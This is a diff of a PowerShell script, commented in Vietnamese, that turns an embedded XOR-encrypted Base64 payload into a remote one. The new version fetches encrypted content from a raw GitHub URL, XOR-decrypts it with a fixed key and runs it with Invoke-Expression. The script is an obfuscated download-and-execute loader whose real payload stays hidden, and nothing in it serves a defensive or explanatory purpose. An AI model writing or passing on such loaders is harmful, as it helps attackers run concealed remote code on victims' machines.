@@ -1,35 +1,25 @@
-# Định nghĩa hàm XOR để giải mã
+# Định nghĩa hàm XOR-Decryption
 function XOR-Decryption {
     param (
         [string]$inputString,
         [string]$key
     )
 
-    # Chuyển đổi nội dung đã mã hóa từ Base64 sang mảng byte
     $inputBytes = [System.Convert]::FromBase64String($inputString)
     $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($key)
+    $outputBytes = [byte[]]@()
 
-    $outputBytes = @()
     for ($i = 0; $i -lt $inputBytes.Length; $i++) {
-        # XOR từng byte với byte tương ứng từ khóa
-        $xorByte = $inputBytes[$i] -bxor $keyBytes[$i % $keyBytes.Length]
-        $outputBytes += [System.Convert]::ToByte($xorByte)
+        $outputBytes += [byte]($inputBytes[$i] -bxor $keyBytes[$i % $keyBytes.Length])
     }
 
-    # Chuyển đổi mảng byte đã XOR thành chuỗi UTF-8
-    $outputString = [System.Text.Encoding]::UTF8.GetString($outputBytes)
-    return $outputString
+    return [System.Text.Encoding]::UTF8.GetString($outputBytes)
 }
 
-# Nội dung đã mã hóa dưới dạng Base64
-$encryptedText = "VwRDT0VWAw0RGw0LGg0cAw0RGw0LGg0cAw0RGw0LGg0cAw0RGw0LGg0cAw0RUW9HAQYGAhUNMAoNBgAaH0VEUywNBAofDkguFgcxFxQBDhYNU0gWAAxUSQ0NBxUQSEpbGQQOXQIKBg0BCRAKFhcAHQsADgsNXQYMH0pAWARIRFdQXRERGBFWHgQKHEoQBBIXHwoCFksEGFRbU0g2AQA2ChYQEDUCABYdBQJzOgsVHQ4RRiABAxcGARYdBAtZVxYAAAwEHyYWHREGHBFaKAoXBwANBm8="
-
-# Khóa XOR
+# Tải và giải mã nội dung
+$encryptedText = Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Ilovecodepython/Xor-test/main/content.txt" -UseBasicParsing
 $key = "secretkey"
-
-# Giải mã nội dung bằng XOR
-$decryptedContent = XOR-Decryption -inputString $encryptedText -key $key
-
+$decryptedContent = XOR-Decryption -inputString $encryptedText.Content -key $key
 
 # Thực thi nội dung giải mã
 iex $decryptedContent
